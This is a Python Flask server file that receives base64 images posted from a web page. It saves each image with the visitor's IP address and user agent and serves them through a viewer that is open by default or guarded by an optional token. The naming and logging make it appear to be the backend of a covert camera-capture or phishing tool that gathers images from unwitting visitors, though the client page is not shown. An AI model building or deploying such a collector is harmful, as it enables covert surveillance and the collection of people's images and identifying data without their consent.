import os
import json
import base64
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory, abort

BASE = os.path.dirname(os.path.abspath(__file__))
CAPTURE_DIR = os.path.join(BASE, "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)

# اتركه فارغاً = مفتوح. عيّن قيمة = لازم ?k=TOKEN في /viewer
VIEWER_TOKEN = os.environ.get("VIEWER_TOKEN", "")

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 32 * 1024 * 1024


def _allowed():
    if not VIEWER_TOKEN:
        return True
    return (request.args.get("k") or request.headers.get("X-Viewer-Token")) == VIEWER_TOKEN


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/viewer")
def viewer():
    if not _allowed():
        abort(403)
    return render_template("viewer.html")


@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json(silent=True) or {}
    img = data.get("img", "")
    if not img or "," not in img:
        return jsonify({"ok": False, "err": "no image"}), 400

    try:
        _, b64 = img.split(",", 1)
        raw = base64.b64decode(b64)
    except Exception as e:
        return jsonify({"ok": False, "err": str(e)}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    fname = f"shot_{ts}.jpg"
    with open(os.path.join(CAPTURE_DIR, fname), "wb") as f:
        f.write(raw)

    meta = {
        "file": fname,
        "time": datetime.now().isoformat(timespec="seconds"),
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", ""),
        "size": len(raw),
    }
    with open(os.path.join(CAPTURE_DIR, fname + ".json"), "w", encoding="utf-8") as f:
        json.dump(meta, f, ensure_ascii=False, indent=2)

    return jsonify({"ok": True, "file": fname})


@app.route("/api/captures")
def api_captures():
    if not _allowed():
        abort(403)
    items = []
    for name in sorted(os.listdir(CAPTURE_DIR), reverse=True):
        if not name.endswith(".jpg"):
            continue
        meta = {}
        mp = os.path.join(CAPTURE_DIR, name + ".json")
        if os.path.exists(mp):
            try:
                with open(mp, encoding="utf-8") as f:
                    meta = json.load(f)
            except Exception:
                pass
        items.append({
            "file": name,
            "url": f"/captures/{name}",
            "time": meta.get("time", ""),
            "ip": (meta.get("ip", "") or "").split(",")[0],
            "ua": meta.get("ua", ""),
        })
    return jsonify({"ok": True, "items": items})


@app.route("/captures/<path:fname>")
def serve_capture(fname):
    if not _allowed():
        abort(403)
    return send_from_directory(CAPTURE_DIR, fname)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port, threaded=True)